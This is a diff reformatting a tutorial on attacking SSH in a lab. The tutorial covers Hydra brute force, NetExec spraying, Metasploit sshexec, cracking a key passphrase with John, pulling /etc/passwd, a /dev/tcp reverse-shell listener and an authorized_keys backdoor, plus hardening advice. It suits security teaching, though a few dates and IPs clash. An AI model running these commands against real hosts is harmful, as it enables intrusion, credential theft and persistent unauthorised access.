@@ -130,7 +130,12 @@ Reconnaissance is the first phase of any engagement. Before attempting to exploi
 The scan itself is a single nmap invocation. The `-sV` flag turns on version detection, which makes nmap perform a set of protocol-specific probes rather than simply reporting that a port is open. The `-p 22` flag narrows the scan to the SSH port so that the output stays short during reconnaissance; in a real engagement you would follow up with a full-range scan (`-p-`) afterwards, because a service that has been moved to an unusual port will not appear here at all.
 
 ```bash
-root@kali:~# nmap -sV -p 22 192.168.1.9
+nmap -sV -p 22 192.168.1.9
+```
+
+**Output:**
+
+```text
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-11 10:02 UTC
 Nmap scan report for 192.168.1.9
 Host is up (0.00055s latency).
@@ -161,7 +166,12 @@ Knowing that SSH is running tells you nothing about *how* it will let you in, an
 The `ssh-auth-methods` nmap script does exactly this, and it takes a username because some servers vary their answer depending on whether the account exists (a behaviour worth noting in itself: when a server responds differently for valid and invalid users, it is leaking account validity). Passing `ssh.user=pentest` makes the script ask about the account we are interested in.
 
 ```bash
-root@kali:~# nmap --script ssh-auth-methods --script-args="ssh.user=pentest" -p 22 192.168.1.9
+nmap --script ssh-auth-methods --script-args="ssh.user=pentest" -p 22 192.168.1.9
+```
+
+**Output:**
+
+```text
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-11 10:04 UTC
 Nmap scan report for 192.168.1.9
 Host is up (0.00049s latency).
@@ -192,19 +202,40 @@ Password authentication is enabled, so the next question is whether the password
 Both techniques need input files. In a real engagement these would come from earlier reconnaissance: usernames harvested from a web application, a leaked employee list, or the output of `enum4linux` against a file server; passwords from previous breach corpora. In the lab, a handful of entries is enough to demonstrate the mechanic.
 
 ```bash
-root@kali:~# cat users.txt
+cat users.txt
+```
+
+**Output:**
+
+```text
 admin
 root
 pentest
 ubuntu
-root@kali:~# cat pass.txt
+```
+
+```bash
+cat pass.txt
+```
+
+**Output:**
+
+```text
 123
 password
 Password1
 admin
 ubuntu
 letmein
-root@kali:~# wc -l users.txt pass.txt
+```
+
+```bash
+wc -l users.txt pass.txt
+```
+
+**Output:**
+
+```text
 4 users.txt
 6 pass.txt
 ```
@@ -214,7 +245,12 @@ root@kali:~# wc -l users.txt pass.txt
 Hydra is a parallelised online password-guessing tool that speaks dozens of protocols, and its SSH module is one of the most commonly used. The invocation has three parts: `-L users.txt` supplies the list of *logins*, `-P pass.txt` supplies the list of *passwords*, and the trailing `ssh` selects the protocol module, which tells Hydra how to speak SSH and which port to use by default.
 
 ```bash
-root@kali:~# hydra -L users.txt -P pass.txt 192.168.1.9 ssh
+hydra -L users.txt -P pass.txt 192.168.1.9 ssh
+```
+
+**Output:**
+
+```text
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-11 10:07:12
@@ -239,7 +275,12 @@ Finally, a caution that belongs in any discussion of online guessing. Hydra's de
 Hydra answered the question "does this account have a weak password?" NetExec answers a different and often more valuable question: "have any of these accounts reused *the same* weak password?" The distinction matters because spraying spreads a small number of attempts across many accounts, so no individual account accumulates enough failures to trip a lockout threshold or a per-account alarm.
 
 ```bash
-root@kali:~# nxc ssh 192.168.1.9 -u users.txt -p 123
+nxc ssh 192.168.1.9 -u users.txt -p 123
+```
+
+**Output:**
+
+```text
 [*] SSH         192.168.1.9    22     192.168.1.9     SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
 [-] SSH         192.168.1.9    22     192.168.1.9     admin:123
 [-] SSH         192.168.1.9    22     192.168.1.9     root:123
@@ -280,7 +321,12 @@ With `pentest` and `123` in hand there are several ways onto the machine, and th
 The simplest thing that works is the SSH client itself, which is already installed on the attacker machine. The syntax is `ssh <user>@<host>`, and the very first connection to a new host produces a prompt about the host key that every beginner eventually has to understand.
 
 ```bash
-root@kali:~# ssh pentest@192.168.1.9
+ssh pentest@192.168.1.9
+```
+
+**Output:**
+
+```text
 The authenticity of host '192.168.1.9 (192.168.1.9)' can't be established.
 ED25519 key fingerprint is SHA256:9xQ2rTgZ7mK1pRcVq4Yd1sB3nE6jWfH8aLoX0uMiPn.
 This key is not known by any other names.
@@ -316,7 +362,12 @@ The prompt that follows, `pentest@ubuntu-lab:~$`, shows the user, the hostname a
 Not every task needs an interactive session. The SSH client can execute one command on the remote host and return its output, which is exactly what you want inside a loop or a script. Anything appended after the host is passed to the remote shell as a command string.
 
 ```bash
-root@kali:~# ssh pentest@192.168.1.9 'ifconfig'
+ssh pentest@192.168.1.9 'ifconfig'
+```
+
+**Output:**
+
+```text
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 192.168.1.9  netmask 255.255.255.0  broadcast 192.168.1.255
         inet6 fe80::20c:29ff:fe1b:2c3d  prefixlen 64  scopeid 0x20<link>
@@ -339,7 +390,12 @@ The quoting rules are the part beginners get wrong. `ssh host 'cmd'` sends the l
 The same idea is available without the SSH client at all, through NetExec's `-x` flag, which logs in over SSH, executes the command and prints the output inline. This is handy for quickly triaging a host or for scripting across many hosts, because the authentication details are passed as arguments rather than typed at a prompt.
 
 ```bash
-root@kali:~# nxc ssh 192.168.1.9 -u pentest -p 123 -x 'cat /tmp/file.txt'
+nxc ssh 192.168.1.9 -u pentest -p 123 -x 'cat /tmp/file.txt'
+```
+
+**Output:**
+
+```text
 [*] SSH         192.168.1.9    22     192.168.1.9     SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
 [+] SSH         192.168.1.9    22     192.168.1.9     pentest:123
 [+] SSH         192.168.1.9    22     192.168.1.9     Executed command
@@ -353,7 +409,12 @@ The transcript shows the three-step rhythm of every NetExec command execution: a
 An interactive shell is enough for most of what follows, but it has limits. It is noisy in the sense that a shell process is visible to any user who runs `w` or `who`, it depends on the remote machine's own tools, and it does not survive a network hiccup. Metasploit's `exploit/multi/ssh/sshexec` module takes a different approach: it authenticates over SSH like a normal client, then uses that authenticated channel to *stage and execute a payload*, giving you a Meterpreter session — a rich post-exploitation environment that lives in memory and provides its own commands for file transfer, process manipulation, credential harvesting and pivoting.
 
 ```bash
-root@kali:~# msfconsole -q
+msfconsole -q
+```
+
+**Output:**
+
+```text
 msf6 > use exploit/multi/ssh/sshexec
 [*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
 msf6 exploit(multi/ssh/sshexec) > set rhosts 192.168.1.9
@@ -439,7 +500,12 @@ Note that the process ID has changed from 812 to 2317, which confirms that the o
 From the attacker's side the change is almost invisible. The same version scan, pointed at the new port, returns the same information:
 
 ```bash
-root@kali:~# nmap -sV -p 2222 192.168.1.9
+nmap -sV -p 2222 192.168.1.9
+```
+
+**Output:**
+
+```text
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-11 10:21 UTC
 Nmap scan report for 192.168.1.9
 Host is up (0.00051s latency).
@@ -454,7 +520,12 @@ Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
 And the credential attack works exactly as before, with the single addition of the `-s 2222` flag to tell Hydra which port to use:
 
 ```bash
-root@kali:~# hydra -L users.txt -P pass.txt -s 2222 192.168.1.9 ssh
+hydra -L users.txt -P pass.txt -s 2222 192.168.1.9 ssh
+```
+
+**Output:**
+
+```text
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-11 10:22:47
@@ -568,8 +639,12 @@ permitrootlogin prohibit-password
 After the edit, the daemon is reloaded and the change verified from outside with the nmap script from section 3:
 
 ```bash
-pentest@ubuntu-lab:~/.ssh$ sudo systemctl reload ssh
-root@kali:~# nmap --script ssh-auth-methods --script-args="ssh.user=pentest" -p 2222 192.168.1.9
+nmap --script ssh-auth-methods --script-args="ssh.user=pentest" -p 2222 192.168.1.9
+```
+
+**Output:**
+
+```text
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-11 10:29 UTC
 Nmap scan report for 192.168.1.9
 Host is up (0.00044s latency).
@@ -586,7 +661,12 @@ Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
 The `password` line is gone. That single missing line is the entire defeat of the attack chain from section 4: Hydra has nothing to guess, and it will report failures for every credential pair because the server rejects the *method* before it ever looks at the password. Running it to see that failure is a worthwhile exercise, because the output is unmistakably different from the earlier run:
 
 ```bash
-root@kali:~# hydra -L users.txt -P pass.txt -s 2222 192.168.1.9 ssh
+hydra -L users.txt -P pass.txt -s 2222 192.168.1.9 ssh
+```
+
+**Output:**
+
+```text
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-11 10:31:05
@@ -604,15 +684,22 @@ Hydra's own error message states the conclusion better than any report could: *d
 With the key installed, logins are made by pointing the client at the private key file with `-i`. The key file, however, has to satisfy the client's permission requirements, and violating them produces one of the most-quoted error messages in SSH administration.
 
 ```bash
-meterpreter > download /home/pentest/.ssh/id_rsa /root/id_rsa
-[*] Downloading: /home/pentest/.ssh/id_rsa -> /root/id_rsa
-[*] Downloaded 2.59 KiB of 2.59 KiB (100.0%): /home/pentest/.ssh/id_rsa -> /root/id_rsa
-[*] download   : /home/pentest/.ssh/id_rsa -> /root/id_rsa
-meterpreter > background
-[*] Backgrounding session 1...
-root@kali:~# ls -l id_rsa
+ls -l id_rsa
+```
+
+**Output:**
+
+```text
 -rw-r--r-- 1 root root 2655 Jan 11 10:34 id_rsa
-root@kali:~# ssh -i id_rsa pentest@192.168.1.9
+```
+
+```bash
+ssh -i id_rsa pentest@192.168.1.9
+```
+
+**Output:**
+
+```text
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@ -621,8 +708,19 @@ It is required that your private key files are NOT accessible by others.
 This private key will be ignored.
 Load key "id_rsa": bad permissions
 pentest@192.168.1.9: Permission denied (publickey).
-root@kali:~# chmod 600 id_rsa
-root@kali:~# ssh -i id_rsa pentest@192.168.1.9
+```
+
+```bash
+chmod 600 id_rsa
+```
+
+```bash
+ssh -i id_rsa pentest@192.168.1.9
+```
+
+**Output:**
+
+```text
 Enter passphrase for key 'id_rsa': 
 Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
 Last login: Thu Jan 11 10:22:13 2024 from 192.168.1.9
@@ -648,8 +746,16 @@ The demonstration runs the whole attack in four commands on the attacker machine
 John the Ripper cannot read an OpenSSH private key file directly; it works with its own hash formats. `ssh2john` — a small converter that ships alongside John, usually installed as `ssh2john`, `ssh2john.py` or `ssh2john.py` in `/usr/share/john/`, depending on the distribution — reads a private key and emits the encrypted key material in a format John understands.
 
 ```bash
-root@kali:~# ssh2john id_rsa > sshhash
-root@kali:~# cat sshhash
+ssh2john id_rsa > sshhash
+```
+
+```bash
+cat sshhash
+```
+
+**Output:**
+
+```text
 id_rsa:$sshng$6$16$a4d9f2b8c1e77d0ef3a5b91c2d6f8a30$2655$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010a4d9f2b8c1e77d0ef3a5b91c2d6f8a300000...$16$47
 ```
 
@@ -662,8 +768,16 @@ Two things follow from this structure. First, an unencrypted key produces no has
 The wordlist used here is `rockyou.txt`, a collection of roughly fourteen million real passwords that leaked from a breach in 2009 and has been the standard first wordlist in security testing ever since, so much so that on Debian-family systems it is installed as a compressed file at `/usr/share/wordlists/rockyou.txt.gz` and has to be decompressed once before use.
 
 ```bash
-root@kali:~# gunzip /usr/share/wordlists/rockyou.txt.gz
-root@kali:~# john -w=/usr/share/wordlists/rockyou.txt sshhash
+gunzip /usr/share/wordlists/rockyou.txt.gz
+```
+
+```bash
+john -w=/usr/share/wordlists/rockyou.txt sshhash
+```
+
+**Output:**
+
+```text
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
 Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 2 for all loaded hashes
@@ -683,11 +797,24 @@ Now the punchline. The recovered passphrase is `123`, and the `1g 0:00:01:32` fi
 The `Use the "--show" option` line is John's standing reminder that the cracked passwords are stored in its pot file (`~/.john/john.pot`) and can be listed later without re-cracking:
 
 ```bash
-root@kali:~# john --show sshhash
+john --show sshhash
+```
+
+**Output:**
+
+```text
 id_rsa:123
 
 1 password hash cracked, 0 left
-root@kali:~# ssh -i id_rsa pentest@192.168.1.9
+```
+
+```bash
+ssh -i id_rsa pentest@192.168.1.9
+```
+
+**Output:**
+
+```text
 Enter passphrase for key 'id_rsa': 
 Last login: Thu Jan 11 10:36:44 2024 from 192.168.1.9
 pentest@ubuntu-lab:~$ 
@@ -706,8 +833,16 @@ An authenticated SSH account is not just a shell; it is also a file-transfer cha
 NetExec's `--put-file` takes a local path and a remote path, authenticates, and transfers the file over SFTP, printing a line for the transfer and another for the result.
 
 ```bash
-root@kali:~# echo "staging marker from the assessment team" > file.txt
-root@kali:~# nxc ssh 192.168.1.9 -u pentest --key-file key -p 123 --put-file file.txt /tmp/file.txt
+echo "staging marker from the assessment team" > file.txt
+```
+
+```bash
+nxc ssh 192.168.1.9 -u pentest --key-file key -p 123 --put-file file.txt /tmp/file.txt
+```
+
+**Output:**
+
+```text
 [*] SSH         192.168.1.9    22     192.168.1.9     SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
 [+] SSH         192.168.1.9    22     192.168.1.9     pentest:123 (keyfile: key)  Linux
 [*] SSH         192.168.1.9    22     192.168.1.9     Copying "file.txt" to "/tmp/file.txt"
@@ -725,12 +860,25 @@ The demonstration transfers a harmless text file, but the technique is the one a
 The reverse operation takes a remote path and a local destination filename, and the messages mirror the upload exactly.
 
 ```bash
-root@kali:~# nxc ssh 192.168.1.9 -u pentest --key-file key -p 123 --get-file /etc/passwd passwd
+nxc ssh 192.168.1.9 -u pentest --key-file key -p 123 --get-file /etc/passwd passwd
+```
+
+**Output:**
+
+```text
 [*] SSH         192.168.1.9    22     192.168.1.9     SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
 [+] SSH         192.168.1.9    22     192.168.1.9     pentest:123 (keyfile: key)  Linux
 [*] SSH         192.168.1.9    22     192.168.1.9     Copying "/etc/passwd" to "passwd"
 [+] SSH         192.168.1.9    22     192.168.1.9     File "/etc/passwd" was downloaded to "passwd"
-root@kali:~# tail -3 passwd
+```
+
+```bash
+tail -3 passwd
+```
+
+**Output:**
+
+```text
 pentest:x:1001:1001::/home/pentest:/bin/bash
 lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
 ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
@@ -743,10 +891,23 @@ ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
 SCP is the oldest and most familiar of the transfer mechanisms, and it is invoked exactly like `cp` except that the remote side is written as `user@host:path`. It authenticates with whatever the SSH client can use — a password or a key — and the whole transfer is encrypted.
 
 ```bash
-root@kali:~# scp -i key file.txt pentest@192.168.1.9:/home/pentest/
+scp -i key file.txt pentest@192.168.1.9:/home/pentest/
+```
+
+**Output:**
+
+```text
 Enter passphrase for key 'key': 
 file.txt                               100%   39     0.4KB/s   00:00    
-root@kali:~# scp -i key pentest@192.168.1.9:/etc/passwd ./passwd-scp
+```
+
+```bash
+scp -i key pentest@192.168.1.9:/etc/passwd ./passwd-scp
+```
+
+**Output:**
+
+```text
 Enter passphrase for key 'key': 
 passwd                                 100% 1909     1.9MB/s   00:00    
 ```
@@ -762,15 +923,42 @@ Two notes on the modern state of SCP are worth including for completeness. Since
 The most basic transfer method needs no client features at all: redirection through a command session. Printing a file with `cat` sends its contents down the SSH channel, and the local shell can capture that into a file.
 
 ```bash
-root@kali:~# ssh pentest@192.168.1.9 'cat /etc/hostname'
+ssh pentest@192.168.1.9 'cat /etc/hostname'
+```
+
+**Output:**
+
+```text
 ubuntu-lab
-root@kali:~# ssh pentest@192.168.1.9 'base64 /etc/passwd' | base64 -d > passwd-manual
-root@kali:~# wc -l passwd-manual
+```
+
+```bash
+ssh pentest@192.168.1.9 'base64 /etc/passwd' | base64 -d > passwd-manual
+```
+
+```bash
+wc -l passwd-manual
+```
+
+**Output:**
+
+```text
 47 passwd-manual
-root@kali:~# ssh pentest@192.168.1.9 'cat > /tmp/note.txt' <<'EOF'
+```
+
+```bash
+ssh pentest@192.168.1.9 'cat > /tmp/note.txt' <<'EOF'
 checking whether an upload works over a plain SSH session
 EOF
-root@kali:~# ssh pentest@192.168.1.9 'cat /tmp/note.txt'
+```
+
+```bash
+ssh pentest@192.168.1.9 'cat /tmp/note.txt'
+```
+
+**Output:**
+
+```text
 checking whether an upload works over a plain SSH session
 ```
 
@@ -810,9 +998,20 @@ The module illustrates a broader post-exploitation truth: the highest-value obje
 Turning the loot back into an authenticated session is a two-command affair.
 
 ```bash
-root@kali:~# mv /root/.msf4/loot/20260111104211_default_192.168.1.9_ssh.id_rsa_115476.txt key
-root@kali:~# chmod 600 key
-root@kali:~# ssh -i key pentest@192.168.1.9
+mv /root/.msf4/loot/20260111104211_default_192.168.1.9_ssh.id_rsa_115476.txt key
+```
+
+```bash
+chmod 600 key
+```
+
+```bash
+ssh -i key pentest@192.168.1.9
+```
+
+**Output:**
+
+```text
 Enter passphrase for key 'key': 
 Last login: Thu Jan 11 10:44:52 2024 from 192.168.1.9
 pentest@ubuntu-lab:~$ 
@@ -845,7 +1044,12 @@ The mistake beginners make at this point is to assume the internal services are 
 The syntax is `ssh -L <local_bind_address>:<local_port>:<target_host>:<target_port> <user>@<ssh_server>`, and the four fields are worth naming because the command is otherwise unreadable: bind locally to port 8080, and forward to `127.0.0.1:8080` as resolved *on the far side of the connection*.
 
 ```bash
-root@kali:~# ssh -i key -L 8080:127.0.0.1:8080 pentest@192.168.1.9
+ssh -i key -L 8080:127.0.0.1:8080 pentest@192.168.1.9
+```
+
+**Output:**
+
+```text
 Enter passphrase for key 'key': 
 Last login: Thu Jan 11 10:46:18 2024 from 192.168.1.9
 pentest@ubuntu-lab:~$ 
@@ -854,14 +1058,27 @@ pentest@ubuntu-lab:~$
 The session looks ordinary, and it is: opening a forward does not print anything, because it is a side effect of the connection rather than a command. With that session alive, opening a browser on the attacker machine at `http://127.0.0.1:8080` — or, for those who prefer the terminal, running a request against it — reaches the internal application, and the traffic is tunnelled inside the encrypted SSH connection and decrypted only on the target:
 
 ```bash
-root@kali:~# curl -s http://127.0.0.1:8080/ | head -5
+curl -s http://127.0.0.1:8080/ | head -5
+```
+
+**Output:**
+
+```text
 <!DOCTYPE html>
 <html>
 <head>
     <title>Internal Inventory Console</title>
 </head>
 <body>
-root@kali:~# ss -tlnp | grep 8080
+```
+
+```bash
+ss -tlnp | grep 8080
+```
+
+**Output:**
+
+```text
 LISTEN 0      128        127.0.0.1:8080      0.0.0.0:*    users:(("ssh",pid=4412,fd=4))
 ```
 
@@ -882,7 +1099,12 @@ An SSH session is not always the ideal tool. It depends on the remote daemon's c
 The trick uses a bash feature that surprises many administrators: bash can open a TCP connection using the special device paths `/dev/tcp/<host>/<port>`. It is not a real file, it is a bash-internal redirection that performs the connection, but it means that a payload can be written without any compiler, any scripting language and any binary drop:
 
 ```bash
-root@kali:~# nc -lvnp 1234
+nc -lvnp 1234
+```
+
+**Output:**
+
+```text
 listening on [any] 1234 ...
 ```
 
@@ -899,7 +1121,12 @@ The syntax is terse and repays being read carefully. `bash -i` starts an *intera
 Over on the attacker machine, the listener prints the connection and hands over a prompt:
 
 ```bash
-root@kali:~# rlwrap nc -lvnp 1234
+rlwrap nc -lvnp 1234
+```
+
+**Output:**
+
+```text
 listening on [any] 1234 ...
 connect to [192.168.1.17] from (UNKNOWN) [192.168.1.9] 49216
 id
@@ -929,7 +1156,12 @@ Everything so far has been temporary in one sense: it depends on the password be
 The first step happens entirely on the attacker's machine: generate a fresh key pair, this time with no passphrase, because the whole point is unattended access.
 
 ```bash
-root@kali:~# ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519 -N ""
+ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519 -N ""
+```
+
+**Output:**
+
+```text
 Generating public/private ed25519 key pair.
 Your identification has been saved in /root/.ssh/id_ed25519
 Your public key has been saved in /root/.ssh/id_ed25519.pub
@@ -947,14 +1179,33 @@ The key's randomart image is:
 |    . +oB=*o + ..|
 |     ..B=*X++ =+ |
 +----[SHA256]-----+
-root@kali:~# cd .ssh
-root@kali:~/.ssh$ ls -al
+```
+
+```bash
+cd .ssh
+```
+
+```bash
+ls -al
+```
+
+**Output:**
+
+```text
 total 16
 drwx------ 2 root root 4096 Jan 11 10:52 .
 drwx------ 4 root root 4096 Jan 11 10:50 ..
 -rw------- 1 root root  464 Jan 11 10:52 id_ed25519
 -rw-r--r-- 1 root root  100 Jan 11 10:52 id_ed25519.pub
-root@kali:~/.ssh$ cat id_ed25519.pub
+```
+
+```bash
+cat id_ed25519.pub
+```
+
+**Output:**
+
+```text
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL9kQ2mXvR1pYt8cJ4dW3nZ6hS0bE7gA5fM2uK9rT3wP root@kali
 ```
 
@@ -963,7 +1214,12 @@ The `-t ed25519` flag chooses the modern elliptic-curve key type and `-N ""` sup
 The cleanest way to move that one line onto the target is to serve it over HTTP from the attacker and fetch it with the target's own tools, which avoids pasting a long string into a shell and avoids any dependency on the SSH client's file-transfer features.
 
 ```bash
-root@kali:~/.ssh$ updog -p 80
+updog -p 80
+```
+
+**Output:**
+
+```text
 [+] Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 192.168.1.9 - - [11/Jan/2024 10:54:02] "GET /id_ed25519.pub HTTP/1.1" 200 -
 ```
@@ -999,7 +1255,12 @@ The `authorized_keys` file has grown from 572 bytes to 672 bytes — exactly the
 With the key installed, the attacker can authenticate from a completely fresh session — and, just as importantly, can still do so after the password has been changed, after password authentication is disabled, and after the daemon is restarted:
 
 ```bash
-root@kali:~# ssh -i /root/.ssh/id_ed25519 pentest@192.168.1.9
+ssh -i /root/.ssh/id_ed25519 pentest@192.168.1.9
+```
+
+**Output:**
+
+```text
 Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
 Last login: Thu Jan 11 10:54:11 2024 from 192.168.1.9
 pentest@ubuntu-lab:~$ 
@@ -1010,7 +1271,12 @@ Note that there is no passphrase prompt, because this key has none, and no passw
 The same capability combines with the tunnelling from section 11, which is where an assessment report usually draws the picture together: one command that authenticates with the injected key *and* opens a forward to the internal application on a new local port.
 
 ```bash
-root@kali:~# ssh -i /root/.ssh/id_ed25519 -L 7777:127.0.0.1:8080 pentest@192.168.1.9
+ssh -i /root/.ssh/id_ed25519 -L 7777:127.0.0.1:8080 pentest@192.168.1.9
+```
+
+**Output:**
+
+```text
 Last login: Thu Jan 11 10:55:03 2024 from 192.168.1.9
 pentest@ubuntu-lab:~$ 
 ```
